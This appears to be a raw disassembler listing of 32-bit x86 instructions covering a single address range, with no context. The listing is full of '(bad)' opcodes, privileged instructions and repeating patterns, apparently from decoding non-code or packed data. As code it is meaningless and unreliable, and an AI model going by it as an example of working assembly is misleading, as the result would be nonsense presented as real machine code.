  409931:	sub    BYTE PTR [ecx-0x38],al
  409934:	mov    BYTE PTR cs:0x40430000,cl
  40993b:	bound  eax,QWORD PTR ds:0x25404110
  409941:	add    ah,cl
  409943:	inc    ebx
  409944:	add    eax,0x40402562
  409949:	add    BYTE PTR [eax+0x40],al
  40994c:	inc    ecx
  40994d:	inc    ecx
  40994e:	add    eax,0x78434025
  409953:	bound  eax,QWORD PTR [eax-0x7c]
  409956:	inc    eax
  409957:	inc    ecx
  409958:	cmp    al,al
  40995a:	push   ebp
  40995b:	jo     0x40997f
  40995d:	dec    edi
  40995e:	jecxz  0x409900
  409960:	into   
  409961:	jo     0x40992e
  409963:	inc    eax
  409964:	ins    BYTE PTR es:[edi],dx
  409965:	loope  0x40998e
  409967:	daa    
  409968:	cmp    al,0x10
  40996a:	push   esp
  40996b:	inc    eax
  40996c:	inc    edi
  40996d:	cmp    eax,0x5264656b
  409972:	add    DWORD PTR [eax-0x1e],eax
  409975:	in     eax,0x1e
  409977:	xchg   edx,eax
  409978:	(bad)  
  409979:	cs leave 
  40997b:	jne    0x4099a6
  40997d:	cmp    eax,0x40404173
  409982:	inc    ebx
  409983:	int3   
  409984:	add    BYTE PTR ds:0x56240,al
  40998a:	inc    ebx
  40998b:	inc    eax
  40998c:	inc    eax
  40998d:	add    BYTE PTR [ecx+0x62],al
  409990:	bound  eax,QWORD PTR [eax]
  409992:	int3   
  409993:	inc    eax
  409994:	inc    ebx
  409995:	add    eax,0x43624041
  40999a:	adc    BYTE PTR [ecx+0x5],al
  40999d:	inc    eax
  40999e:	add    eax,0xb7426b25
  4099a3:	push   esp
  4099a4:	call   FWORD PTR [eax+0x42221c9f]
  4099aa:	jne    0x40998c
  4099ac:	inc    ecx
  4099ad:	jbe    0x409951
  4099af:	rcl    BYTE PTR [ecx-0x1c],1
  4099b2:	mov    ds:0x628fe315,al
  4099b7:	inc    ebx
  4099b8:	inc    eax
  4099b9:	adc    BYTE PTR ds:0x4158cc40,al
  4099bf:	inc    ebx
  4099c0:	bound  eax,QWORD PTR [ecx+0x40]
  4099c3:	add    eax,0x4140
  4099c8:	and    eax,0x40400062
  4099cd:	add    eax,0x84404340
  4099d2:	int3   
  4099d3:	js     0x4099d5
  4099d5:	inc    ecx
  4099d6:	adc    BYTE PTR [edx+0xf],ah
  4099d9:	sub    DWORD PTR gs:[ebx+0x42],esp
  4099dd:	je     0x409a08
  4099df:	and    eax,0x3f819003
  4099e4:	aam    0x94
  4099e6:	pop    ebx
  4099e7:	loope  0x4099db
  4099e9:	inc    ebx
  4099ea:	fxch   st(4)
  4099ec:	and    BYTE PTR [eax-0x1f],al
  4099ef:	push   eax
  4099f0:	sub    cl,0xc8
  4099f3:	mov    ah,0xe2
  4099f5:	inc    eax
  4099f6:	dec    eax
  4099f7:	popa   
  4099f8:	add    BYTE PTR [edi],bl
  4099fa:	adc    BYTE PTR ds:0x25e040a8,0x8e
  409a01:	cli    
  409a02:	add    BYTE PTR [eax+0x41],al
  409a05:	inc    eax
  409a06:	inc    ebx
  409a07:	bound  ax,DWORD PTR ds:0x40434100
  409a0e:	add    eax,0x40054062
  409a13:	bound  eax,QWORD PTR [ecx+0x40]
  409a16:	inc    ebx
  409a17:	inc    eax
  409a18:	add    eax,0x25405841
  409a1d:	bound  eax,QWORD PTR [eax+0x43]
  409a20:	inc    eax
  409a21:	adc    BYTE PTR [edi+ebx*1-0x5cdcafee],bh
  409a28:	cli    
  409a29:	mov    es,WORD PTR ds:0x48405822
  409a2f:	ins    DWORD PTR es:[edi],dx
  409a30:	(bad)  
  409a31:	or     eax,0x411153c9
  409a36:	loopne 0x409a5b
  409a38:	cmc    
  409a39:	inc    ecx
  409a3a:	mov    esp,es
  409a3c:	retf   
  409a3d:	pusha  
  409a3e:	and    DWORD PTR [edi+0x4f05451e],edi
  409a44:	inc    esp
  409a45:	inc    eax
  409a46:	aaa    
  409a47:	and    eax,0x40cdf045
  409a4c:	dec    ebp
  409a4d:	jle    0x409ab9
  409a4f:	popa   
  409a50:	xchg   edx,eax
  409a51:	stc    
  409a52:	sahf   
  409a53:	sub    esi,DWORD PTR [eax]
  409a55:	and    al,0x2e
  409a57:	inc    eax
  409a58:	inc    ecx
  409a59:	inc    ebx
  409a5a:	inc    eax
  409a5b:	add    eax,0x43406262
  409a60:	inc    ecx
  409a61:	adc    BYTE PTR [eax],al
  409a63:	inc    eax
  409a64:	add    eax,0x43000562
  409a69:	add    BYTE PTR [ecx+0x40],al
  409a6c:	inc    eax
  409a6d:	add    eax,0x400062
  409a72:	inc    ebx
  409a73:	inc    eax
  409a74:	js     0x409ab7
  409a76:	inc    ecx
  409a77:	bound  eax,QWORD PTR [eax+0x31]
  409a7a:	mov    WORD PTR fs:0x2a7e4d23,ss
  409a81:	mov    ds:0x62c905f6,eax
  409a86:	retf   
  409a87:	or     ebp,DWORD PTR [ebx]
  409a89:	inc    ebx
  409a8a:	addr16 call 0xa1a1:0x7d350526
  409a92:	mov    DWORD PTR [edi-0x14e1366e],esi
  409a98:	cs dec esi
  409a9a:	mov    fs,WORD PTR [ebx+esi*2+0x70]
  409a9e:	cmp    edi,DWORD PTR [ebp+0x36]
  409aa1:	and    BYTE PTR [edi+0x56da9cf8],al
  409aa7:	bound  eax,QWORD PTR [eax+0x5]
  409aaa:	inc    ecx
  409aab:	add    BYTE PTR [ebx+0x40],al
  409aae:	inc    eax
  409aaf:	inc    ecx
  409ab0:	inc    eax
  409ab1:	inc    eax
  409ab2:	bound  eax,QWORD PTR ds:0x5624300
  409ab8:	add    BYTE PTR [eax+0x40],al
  409abb:	add    BYTE PTR [ecx+0x43],al
  409abe:	add    BYTE PTR [eax+0x41],al
  409ac1:	add    eax,0x40436200
  409ac6:	inc    eax
  409ac7:	add    eax,0x602ce262
  409acc:	dec    esp
  409acd:	mov    cl,BYTE PTR ds:0x677d3495
  409ad3:	and    bl,al
  409ad5:	adc    eax,0xd0c2cc4b
  409ada:	and    BYTE PTR [edx-0x22],ah
  409add:	inc    edx
  409ade:	inc    ecx
  409adf:	test   al,0x68
  409ae1:	jge    0x409b43
  409ae3:	xor    eax,0x11c0c7b0
  409ae8:	test   al,0xc6
  409aea:	and    eax,0x74093840
  409aef:	inc    ecx
  409af0:	adc    BYTE PTR [ebp-0x1f],bh
  409af3:	mov    al,ds:0x2bf9fab1
  409af8:	pop    eax
  409af9:	xor    eax,0x4041b52e
  409afe:	add    eax,0x41624340
  409b03:	test   BYTE PTR [eax],al
  409b05:	and    eax,0x404043
  409b0a:	add    BYTE PTR ds:0x626210,al
  409b10:	add    eax,0x43404140
  409b15:	inc    eax
  409b16:	inc    ecx
  409b17:	add    eax,0x10664062
  409b1c:	inc    ebx
  409b1d:	(bad)  
  409b1e:	xlat   BYTE PTR ds:[ebx]
  409b1f:	mov    BYTE PTR [edx-0x1e827f6c],bl
  409b25:	and    ebp,eax
  409b27:	or     eax,0x2bc36443
  409b2c:	ds inc edx
  409b2e:	jmp    0x44518674
  409b33:	jge    0x409b56
  409b35:	and    BYTE PTR [ebp-0x67],bh
  409b38:	jbe    0x409b3c
  409b3a:	dec    edx
  409b3b:	sbb    DWORD PTR [edi-0x7e381ce],edx
  409b41:	retf   
  409b42:	fdivr  DWORD PTR [ebp+0x28]
  409b45:	push   ebp
  409b46:	and    DWORD PTR [eax+ebx*4-0x50],esp
  409b4a:	mov    edi,0x59e36310
  409b4f:	add    eax,0x4041cc
  409b54:	add    BYTE PTR [eax],al
  409b56:	inc    eax
  409b57:	inc    eax
  409b58:	inc    ebx
  409b59:	bound  eax,QWORD PTR [eax]
  409b5b:	inc    eax
  409b5c:	inc    eax
  409b5d:	add    eax,0x62434162
  409b62:	inc    eax
  409b63:	js     0x409b75
  409b65:	inc    ecx
  409b66:	add    eax,0x5404325
  409b6b:	bound  eax,QWORD PTR [eax+0x40]
  409b6e:	inc    ecx
  409b6f:	inc    ebx
  409b70:	stc    
  409b71:	adc    eax,0x2b7cbf15
  409b76:	cmovne eax,DWORD PTR [esi-0x2b40bdbf]
  409b7d:	mov    ds:0x4243ca25,eax
  409b82:	inc    esi
  409b83:	(bad)  
  409b84:	jl     0x409bb0
  409b86:	adc    al,0x52
  409b88:	jmp    0x22a0:0x47a838e4
  409b8f:	sub    BYTE PTR [edx],dl
  409b91:	cli    
  409b92:	sub    DWORD PTR [edx+0x7c],eax
  409b95:	xor    DWORD PTR [ecx],esi
  409b97:	cs clc 
  409b99:	xchg   esi,eax
  409b9a:	fs mov eax,0x25534040
  409ba0:	inc    ecx
  409ba1:	bound  eax,QWORD PTR [ebx+0x0]
  409ba4:	adc    BYTE PTR [eax+0x0],al
  409ba7:	add    eax,0x62410040
  409bac:	inc    eax
  409bad:	add    BYTE PTR [ebx-0x34],al
  409bb0:	inc    eax
  409bb1:	add    eax,0x78434040
  409bb6:	bound  eax,QWORD PTR [ecx+0x78]
  409bb9:	add    eax,0x62404043
  409bbe:	sbb    eax,DWORD PTR [edi+ebx*2+0x607bfc59]
  409bc5:	mov    al,0xf2
  409bc7:	adc    eax,0xaa6257be
  409bcc:	xor    ebx,DWORD PTR ds:0x6d944148
  409bd2:	les    edi,FWORD PTR [ebx+0x23]
  409bd5:	adc    edi,DWORD PTR [edi+edx*4+0x5]
  409bd9:	lods   al,BYTE PTR ds:[esi]
  409bda:	dec    edi
  409bdb:	in     al,0x25
  409bdd:	inc    eax
  409bde:	inc    ebx
  409bdf:	aam    0x47
  409be1:	fs inc eax
  409be3:	jnp    0x409c47
  409be5:	popa   
  409be6:	cs fs retf 0x408e
  409beb:	fiadd  WORD PTR [ecx+0x40]
  409bee:	add    eax,0x43436240
  409bf3:	add    eax,0x62004040
  409bf8:	inc    eax
  409bf9:	add    BYTE PTR [ecx+0x40],al
  409bfc:	inc    ebx
  409bfd:	test   BYTE PTR ds:0x58054041,ah
  409c03:	inc    eax
  409c04:	inc    eax
  409c05:	bound  eax,QWORD PTR [eax+0x66]
  409c08:	inc    ecx
  409c09:	inc    eax
  409c0a:	add    eax,0x2d48a300
  409c0f:	cli    
  409c10:	aaa    
  409c11:	ins    BYTE PTR es:[edi],dx
  409c12:	add    DWORD PTR [ebx+0x13],edi
  409c15:	test   eax,0xd1f882ca
  409c1a:	popf   
  409c1b:	enter  0x3040,0x1d
  409c1f:	or     eax,0x7b901a92
  409c24:	popa   
  409c25:	jmp    0x409c0a
  409c27:	xchg   esp,eax
  409c28:	arpl   WORD PTR [edi*2+0x1f30c502],di
  409c2f:	xchg   ebx,eax
  409c30:	stos   DWORD PTR es:[edi],eax
  409c31:	pop    esp
  409c32:	ret    
  409c33:	jnp    0x409c22
  409c35:	jmp    FWORD PTR [edx+0x64]
  409c38:	nop
  409c39:	in     al,dx
  409c3a:	inc    eax
  409c3b:	jnp    0x409c0b
  409c3d:	add    BYTE PTR [eax],al
  409c3f:	inc    ebx
  409c40:	inc    eax
  409c41:	bound  eax,QWORD PTR ds:0x25404110
  409c47:	add    ah,cl
  409c49:	inc    ebx
  409c4a:	add    eax,0x40402562
  409c4f:	add    BYTE PTR [eax+0x40],al
  409c52:	inc    ecx
  409c53:	inc    ecx
  409c54:	add    eax,0x78434025
  409c59:	bound  eax,QWORD PTR [eax-0x7c]
  409c5c:	inc    eax
  409c5d:	inc    ecx
  409c5e:	xor    bl,ah
  409c60:	stc    
  409c61:	arpl   WORD PTR [ecx],si
  409c63:	add    DWORD PTR [ebx+0x79],edi
  409c66:	call   FWORD PTR [ebx-0x628b5680]
  409c6c:	les    si,DWORD PTR [eax]
  409c6f:	xchg   esi,eax
  409c70:	ret    
  409c71:	mov    fs,WORD PTR [ebx-0x70]
  409c74:	jp     0x409c5f
  409c76:	jmp    FWORD PTR [edx]
  409c78:	cli    
  409c79:	dec    ecx
  409c7a:	mov    ds:0x53c475e3,eax
  409c7f:	lahf   
  409c80:	gs mov cl,0xe4
  409c83:	inc    esp
  409c84:	jp     0x409c85
  409c86:	and    DWORD PTR [ecx-0x8],ecx
  409c89:	mov    WORD PTR [eax+0x3fc85584],gs
  409c8f:	fld    QWORD PTR [eax+0x15]
  409c92:	dec    eax
  409c93:	inc    ecx
  409c94:	inc    eax
  409c95:	inc    eax
  409c96:	inc    ebx
  409c97:	int3   
  409c98:	add    BYTE PTR ds:0x56240,al
  409c9e:	inc    ebx
  409c9f:	inc    eax
  409ca0:	inc    eax
  409ca1:	add    BYTE PTR [ecx+0x62],al
  409ca4:	bound  eax,QWORD PTR [eax]
  409ca6:	int3   
  409ca7:	inc    eax
  409ca8:	inc    ebx
  409ca9:	add    eax,0x43624041
  409cae:	adc    BYTE PTR [ecx+0x5],al
  409cb1:	inc    eax
  409cb2:	ret    
  409cb3:	jp     0x409cea
  409cb5:	jae    0x409d16
  409cb7:	inc    eax
  409cb8:	dec    ebx
  409cb9:	xor    eax,0x22c84b40
  409cbe:	aad    0x44
  409cc0:	cli    
  409cc1:	inc    edx
  409cc2:	inc    eax
  409cc3:	jp     0x409d04
  409cc5:	pusha  
  409cc6:	pop    edx
  409cc7:	ret    0x6fa
  409cca:	pop    eax
  409ccb:	inc    esp
  409ccc:	aas    
  409ccd:	ja     0x409d1d
  409ccf:	test   eax,0x7980501d
  409cd4:	leave  
  409cd5:	daa    
  409cd6:	stos   DWORD PTR es:[edi],eax
  409cd7:	mov    al,0xab
  409cd9:	data16 test al,0xbf
  409cdc:	xor    ebp,ecx
  409cde:	out    dx,eax
  409cdf:	inc    ebp
  409ce0:	mov    esp,0x40436265
  409ce5:	adc    BYTE PTR ds:0x4158cc40,al
  409ceb:	inc    ebx
  409cec:	bound  eax,QWORD PTR [ecx+0x40]
  409cef:	add    eax,0x4140
  409cf4:	and    eax,0x40400062
  409cf9:	add    eax,0x84404340
  409cfe:	int3   
  409cff:	js     0x409d01
  409d01:	inc    ecx
  409d02:	adc    BYTE PTR [edx+0xf],ah
  409d05:	push   0x5de1c379
  409d0a:	push   ds
  409d0b:	or     eax,0x63b72ae8
  409d10:	mov    db5,esp
  409d13:	leave  
  409d14:	arpl   WORD PTR [eax+0x79],ax
  409d17:	inc    edx
  409d18:	loope  0x409d89
  409d1a:	arpl   WORD PTR [eax+0x21b1bae3],sp
  409d20:	xor    dh,dh
  409d22:	push   eax
  409d23:	or     eax,0x577905a9
  409d28:	cmp    eax,DWORD PTR [ebx]
  409d2a:	fmul   st(5),st
  409d2c:	test   al,0x86
  409d2e:	test   eax,0x11c53239
  409d33:	mov    dl,0x5
  409d35:	jo     0x409db0
  409d37:	dec    eax
  409d38:	aas    
  409d39:	add    BYTE PTR [eax+0x41],al
  409d3c:	inc    eax
  409d3d:	inc    ebx
  409d3e:	bound  ax,DWORD PTR ds:0x40434100
  409d45:	add    eax,0x40054062
  409d4a:	bound  eax,QWORD PTR [ecx+0x40]
  409d4d:	inc    ebx
  409d4e:	inc    eax
  409d4f:	add    eax,0x25405841
  409d54:	bound  eax,QWORD PTR [eax+0x43]
  409d57:	inc    eax
  409d58:	adc    BYTE PTR [edi],dh
  409d5a:	bound  eax,QWORD PTR ds:0xed9fb9cb
  409d60:	pop    ds
  409d61:	out    0x2b,al
  409d63:	leave  
  409d64:	dec    eax
  409d65:	add    eax,0xa3ff6e79
  409d6a:	or     BYTE PTR [esi],ah
  409d6c:	inc    ebx
  409d6d:	xchg   BYTE PTR [esi+0x62b4ffb5],cl
  409d73:	sbb    bh,0x70
  409d76:	jns    0x409dd7
  409d78:	jae    0x409d76
  409d7a:	dec    esp
  409d7b:	jae    0x409d59
  409d7d:	mov    eax,0x68638188
  409d82:	fwait
  409d83:	mov    al,0x8a
  409d85:	add    eax,0x4e1e4179
  409d8a:	int    0x15
  409d8c:	inc    eax
  409d8d:	inc    ecx
  409d8e:	inc    ebx
  409d8f:	inc    eax
  409d90:	add    eax,0x43406262
  409d95:	inc    ecx
  409d96:	adc    BYTE PTR [eax],al
  409d98:	inc    eax
  409d99:	add    eax,0x43000562
  409d9e:	add    BYTE PTR [ecx+0x40],al
  409da1:	inc    eax
  409da2:	add    eax,0x400062
  409da7:	inc    ebx
  409da8:	inc    eax
  409da9:	js     0x409dec
  409dab:	inc    ecx
  409dac:	bound  eax,QWORD PTR [eax+0x34]
  409daf:	xchg   bh,dh
  409db1:	add    ah,dl
  409db3:	mov    al,0xe5
  409db5:	dec    esi
  409db6:	test   al,0x78
  409db8:	jns    0x409d79
  409dba:	and    DWORD PTR [ebx-0x48fabe64],ebx
  409dc0:	lock or DWORD PTR ds:0x87c034cc,ebx
  409dc7:	add    eax,0x8be10979
  409dcc:	inc    eax
  409dcd:	jb     0x409e31
  409dcf:	inc    eax
  409dd0:	add    eax,0x40430041
  409dd5:	inc    eax
  409dd6:	inc    ecx
  409dd7:	inc    eax
  409dd8:	inc    eax
  409dd9:	bound  eax,QWORD PTR ds:0x5624300
  409ddf:	add    BYTE PTR [eax+0x40],al
  409de2:	add    BYTE PTR [ecx+0x43],al
  409de5:	add    BYTE PTR [eax+0x41],al
  409de8:	add    eax,0x40436200
  409ded:	inc    eax
  409dee:	add    eax,0xe0866862
  409df3:	adc    BYTE PTR [eax+0x5f],0x48
  409df7:	cli    
  409df8:	inc    ecx
  409df9:	jb     0x409e74
  409dfb:	emms   
  409dfd:	cmp    ebx,DWORD PTR [eax-0x52]
  409e00:	popa   
  409e01:	mov    dh,0xd9
  409e03:	outs   dx,BYTE PTR ds:[esi]
  409e04:	push   eax
  409e05:	xor    BYTE PTR [ebx+0x7905dc0d],ah
  409e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e0c:	jg     0x409e6a
  409e0e:	addr16 inc ecx
  409e10:	arpl   WORD PTR [esi+0x7750736b],ax
  409e16:	add    BYTE PTR [edi-0x80],al
  409e19:	aaa    
  409e1a:	jns    0x409e8a
  409e1c:	inc    ecx
  409e1d:	inc    eax
  409e1e:	add    eax,0x41624340
  409e23:	test   BYTE PTR [eax],al
  409e25:	and    eax,0x404043
  409e2a:	add    BYTE PTR ds:0x626210,al
  409e30:	add    eax,0x43404140
  409e35:	inc    eax
  409e36:	inc    ecx
  409e37:	add    eax,0x10664062
  409e3c:	inc    ebx
  409e3d:	bound  edi,QWORD PTR [edi+0x1f]
  409e40:	xor    al,bl
  409e42:	xchg   ecx,eax
  409e43:	mov    ch,0x57
  409e45:	mov    ebx,0x73620504
  409e4a:	inc    edx
  409e4b:	add    eax,0xaae15179
  409e50:	lods   al,BYTE PTR ds:[esi]
  409e51:	stc    
  409e52:	rol    DWORD PTR [esi-0x5260f2ae],0xc1
  409e59:	add    eax,0x4041cc
  409e5e:	add    BYTE PTR [eax],al
  409e60:	inc    eax
  409e61:	inc    eax
  409e62:	inc    ebx
  409e63:	bound  eax,QWORD PTR [eax]
  409e65:	inc    eax
  409e66:	inc    eax
  409e67:	add    eax,0x62434162
  409e6c:	inc    eax
  409e6d:	js     0x409e7f
  409e6f:	inc    ecx
  409e70:	add    eax,0x5404325
  409e75:	bound  eax,QWORD PTR [eax+0x40]
  409e78:	inc    ecx
  409e79:	inc    ebx
  409e7a:	lods   al,BYTE PTR ds:[esi]
  409e7b:	enter  0x7823,0x6d
  409e7f:	dec    eax
  409e80:	aas    
  409e81:	ins    BYTE PTR es:[edi],dx
  409e82:	add    eax,0x36bfb442
  409e87:	mov    al,ds:0x21417e32
  409e8c:	add    eax,0x602e1778
  409e91:	arpl   WORD PTR [edi-0x1],dx
  409e94:	xchg   BYTE PTR [edx+0x41345602],bh
  409e9a:	in     al,dx
  409e9b:	test   al,0x62
  409e9d:	js     0x409ee2
  409e9f:	popa   
  409ea0:	and    eax,0x436241
  409ea5:	adc    BYTE PTR [eax+0x0],al
  409ea8:	add    eax,0x62410040
  409ead:	inc    eax
  409eae:	add    BYTE PTR [ebx-0x34],al
  409eb1:	inc    eax
  409eb2:	add    eax,0x78434040
  409eb7:	bound  eax,QWORD PTR [ecx+0x78]
  409eba:	add    eax,0x62404043
  409ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ec0:	in     al,dx
  409ec1:	clc    
  409ec2:	adc    BYTE PTR [eax-0x59],al
  409ec5:	add    BYTE PTR [ebp+0x35],bl
  409ec8:	jne    0x409e74
  409eca:	mov    ah,0x16
  409ecc:	js     0x409ee5
  409ece:	pusha  
  409ecf:	sub    BYTE PTR [ecx],ch
  409ed1:	adc    eax,0x40a29041
  409ed6:	pop    ds
  409ed7:	retf   0x5721
  409eda:	ret    0x784c
  409edd:	jb     0x409f20
  409edf:	inc    eax
  409ee0:	add    eax,0x43436240
  409ee5:	add    eax,0x62004040
  409eea:	inc    eax
  409eeb:	add    BYTE PTR [ecx+0x40],al
  409eee:	inc    ebx
  409eef:	test   BYTE PTR ds:0x58054041,ah
  409ef5:	inc    eax
  409ef6:	inc    eax
  409ef7:	bound  eax,QWORD PTR [eax+0x66]
  409efa:	inc    ecx
  409efb:	inc    eax
  409efc:	add    eax,0x621f4e00
  409f01:	out    dx,eax
  409f02:	inc    eax
  409f03:	test   cl,ch
  409f05:	inc    ebx
  409f06:	popa   
  409f07:	out    dx,eax
  409f08:	inc    ecx
  409f09:	cli    
  409f0a:	bound  edi,QWORD PTR [ebp+0x7418078]
  409f10:	cwde   
  409f11:	test   al,0xd2
  409f13:	ins    DWORD PTR es:[edi],dx
  409f14:	loopne 0x409f25
  409f16:	pusha  
  409f17:	add    BYTE PTR [eax],al
  409f19:	inc    ebx
  409f1a:	inc    eax
  409f1b:	bound  eax,QWORD PTR ds:0x25404110
  409f21:	add    ah,cl
  409f23:	inc    ebx
  409f24:	add    eax,0x40402562
  409f29:	add    BYTE PTR [eax+0x40],al
  409f2c:	inc    ecx
  409f2d:	inc    ecx
  409f2e:	add    eax,0x78434025
  409f33:	bound  eax,QWORD PTR [eax-0x7c]
  409f36:	inc    eax
  409f37:	inc    ecx
  409f38:	test   BYTE PTR [ecx],0xd
  409f3b:	mov    al,ds:0x2540789d
  409f40:	pop    ebp
  409f41:	test   al,0x57
  409f43:	push   edx
  409f44:	nop
  409f45:	iret   
  409f46:	add    al,0xf6
  409f48:	repz adc edi,ebp
  409f4b:	inc    ebx
  409f4c:	loope  0x409fc6
  409f4e:	adc    al,0x41
  409f50:	inc    eax
  409f51:	inc    eax
  409f52:	inc    ebx
  409f53:	int3   
  409f54:	add    BYTE PTR ds:0x56240,al
  409f5a:	inc    ebx
  409f5b:	inc    eax
  409f5c:	inc    eax
  409f5d:	add    BYTE PTR [ecx+0x62],al
  409f60:	bound  eax,QWORD PTR [eax]
  409f62:	int3   
  409f63:	inc    eax
  409f64:	inc    ebx
  409f65:	add    eax,0x43624041
  409f6a:	adc    BYTE PTR [ecx+0x5],al
  409f6d:	inc    eax
  409f6e:	cmp    esp,DWORD PTR [esi]
  409f70:	pop    esp
  409f71:	stc    
  409f72:	fdiv   QWORD PTR [edx]
  409f74:	(bad)  
  409f75:	imul   esp,ebx,0xffffff9a
  409f78:	inc    ecx
  409f79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f7a:	nop
  409f7b:	jg     0x409ff5
  409f7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f7e:	inc    ecx
  409f7f:	test   BYTE PTR [ebp+0x59],0x60
  409f83:	arpl   WORD PTR [ecx],bx
  409f85:	jb     0x409fa7
  409f87:	xchg   DWORD PTR [eax],esi
  409f89:	mov    dh,0x89
  409f8b:	mov    WORD PTR [eax+0x6b],?
  409f8e:	pusha  
  409f8f:	dec    ebx
  409f90:	inc    ecx
  409f91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f92:	mov    ah,0x3
  409f94:	adc    BYTE PTR [edi+0x4362474b],dl
  409f9a:	inc    eax
  409f9b:	adc    BYTE PTR ds:0x4158cc40,al
  409fa1:	inc    ebx
  409fa2:	bound  eax,QWORD PTR [ecx+0x40]
  409fa5:	add    eax,0x4140
  409faa:	and    eax,0x40400062
  409faf:	add    eax,0x84404340
  409fb4:	int3   
  409fb5:	js     0x409fb7
  409fb7:	inc    ecx
  409fb8:	adc    BYTE PTR [edx+0xf],ah
  409fbb:	cwde   
  409fbc:	adc    eax,0x6577b184
  409fc1:	mov    al,ds:0x62571012
  409fc6:	nop
  409fc7:	mov    ebp,0xa86c6991
  409fcc:	out    dx,al
  409fcd:	inc    esi
  409fce:	mov    edi,0x93406077
  409fd3:	adc    bh,dl
  409fd5:	xor    eax,0x2d02b4d8
  409fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fdb:	je     0x409f7f
  409fdd:	inc    eax
  409fde:	add    BYTE PTR ds:[eax+0x41],al
  409fe2:	inc    eax
  409fe3:	inc    ebx
  409fe4:	bound  ax,DWORD PTR ds:0x40434100
  409feb:	add    eax,0x40054062
  409ff0:	bound  eax,QWORD PTR [ecx+0x40]
  409ff3:	inc    ebx
  409ff4:	inc    eax
  409ff5:	add    eax,0x25405841
  409ffa:	bound  eax,QWORD PTR [eax+0x43]
  409ffd:	inc    eax
  409ffe:	adc    BYTE PTR [edi+0x6f],dh
  40a001:	outs   dx,DWORD PTR ds:[esi]
  40a002:	cmp    eax,0x62b80d41
  40a007:	xchg   bh,ah
  40a009:	and    edx,ecx
  40a00b:	inc    ebp
  40a00c:	push   ebp
  40a00d:	inc    ecx
  40a00e:	shl    BYTE PTR [edi-0x7f],0x91
  40a012:	or     eax,0x4460e730
  40a017:	std    
  40a018:	sbb    eax,0xf941c341
  40a01d:	mov    BYTE PTR ds:0xa8604a75,ch
  40a023:	cwde   
  40a024:	mov    al,ds:0x493d2
  40a029:	xor    esi,DWORD PTR [edx+0x1f]
  40a02c:	add    eax,0x6f754494
  40a031:	(bad)  
  40a032:	imul   BYTE PTR [eax+0x40ed524e]
  40a038:	inc    ecx
  40a039:	inc    ebx
  40a03a:	inc    eax
  40a03b:	add    eax,0x43406262
  40a040:	inc    ecx
  40a041:	adc    BYTE PTR [eax],al
  40a043:	inc    eax
  40a044:	add    eax,0x43000562
  40a049:	add    BYTE PTR [ecx+0x40],al
  40a04c:	inc    eax
  40a04d:	add    eax,0x400062
  40a052:	inc    ebx
  40a053:	inc    eax
  40a054:	js     0x40a097
  40a056:	inc    ecx
  40a057:	bound  eax,QWORD PTR [eax+0x6e]
  40a05a:	inc    eax
  40a05b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a05c:	retf   
  40a05d:	adc    bh,cl
  40a05f:	scas   eax,DWORD PTR es:[edi]
  40a060:	pop    ss
  40a061:	inc    eax
  40a062:	jl     0x40a0b4
  40a064:	cmp    al,0x6c
  40a066:	sbb    al,0x30
  40a068:	cmp    al,0x40
  40a06a:	dec    edi
  40a06b:	pusha  
  40a06c:	rol    DWORD PTR [ecx-0x8],0xcb
  40a070:	push   esi
  40a071:	inc    eax
  40a072:	cdq    
  40a073:	push   0xb01f4529
  40a078:	mov    eax,0xec403534
  40a07d:	xor    BYTE PTR ds:0x24069a8,dh
  40a083:	bound  eax,QWORD PTR [eax+0x5]
  40a086:	inc    ecx
  40a087:	add    BYTE PTR [ebx+0x40],al
  40a08a:	inc    eax
  40a08b:	inc    ecx
  40a08c:	inc    eax
  40a08d:	inc    eax
  40a08e:	bound  eax,QWORD PTR ds:0x5624300
  40a094:	add    BYTE PTR [eax+0x40],al
  40a097:	add    BYTE PTR [ecx+0x43],al
  40a09a:	add    BYTE PTR [eax+0x41],al
  40a09d:	add    eax,0x40436200
  40a0a2:	inc    eax
  40a0a3:	add    eax,0x410f1f62
  40a0a8:	adc    BYTE PTR [ecx],0xd8
  40a0ab:	inc    ecx
  40a0ac:	sub    ecx,DWORD PTR [ebp+0x2a]
  40a0af:	cwde   
  40a0b0:	lds    edi,FWORD PTR [eax+ecx*2-0x469bbfb0]
  40a0b7:	cs inc eax
  40a0b9:	inc    edx
  40a0ba:	sub    eax,0x53f1cc40
  40a0bf:	test   al,0x40
  40a0c1:	rcl    dh,0x40
  40a0c4:	outs   dx,DWORD PTR cs:[esi]
  40a0c6:	adc    dl,BYTE PTR [ecx]
  40a0c8:	push   ebx
  40a0c9:	hlt    
  40a0ca:	rol    BYTE PTR [eax+0x66],1
  40a0cd:	inc    ebx
  40a0ce:	mov    ebx,0x62625964
  40a0d3:	jle    0x40a0d6
  40a0d5:	and    eax,0x41a841d4
  40a0da:	inc    eax
  40a0db:	add    eax,0x41624340
  40a0e0:	test   BYTE PTR [eax],al
  40a0e2:	and    eax,0x404043
  40a0e7:	add    BYTE PTR ds:0x626210,al
  40a0ed:	add    eax,0x43404140
  40a0f2:	inc    eax
  40a0f3:	inc    ecx
  40a0f4:	add    eax,0x10664062
  40a0f9:	inc    ebx
  40a0fa:	bound  eax,QWORD PTR [eax+ecx*2+0x77]
  40a0fe:	push   edx
  40a0ff:	inc    esp
  40a100:	mov    cs,ecx
  40a102:	dec    eax
  40a103:	sub    ch,BYTE PTR [edi*2+0x7cf66080]
  40a10a:	cmp    DWORD PTR [edi+0x271f668e],edi
  40a110:	push   eax
  40a111:	(bad)  
  40a112:	aam    0x2a
  40a114:	mov    bh,0x78
  40a116:	dec    ebx
  40a117:	sbb    BYTE PTR [edx+0x48400c41],dl
  40a11d:	call   0x98e0c2a4
  40a122:	int3   
  40a123:	sub    al,BYTE PTR ds:0x4041cc
  40a129:	add    BYTE PTR [eax],al
  40a12b:	inc    eax
  40a12c:	inc    eax
  40a12d:	inc    ebx
  40a12e:	bound  eax,QWORD PTR [eax]
  40a130:	inc    eax
  40a131:	inc    eax
  40a132:	add    eax,0x62434162
  40a137:	inc    eax
  40a138:	js     0x40a14a
  40a13a:	inc    ecx
  40a13b:	add    eax,0x5404325
  40a140:	bound  eax,QWORD PTR [eax+0x40]
  40a143:	inc    ecx
  40a144:	inc    ebx
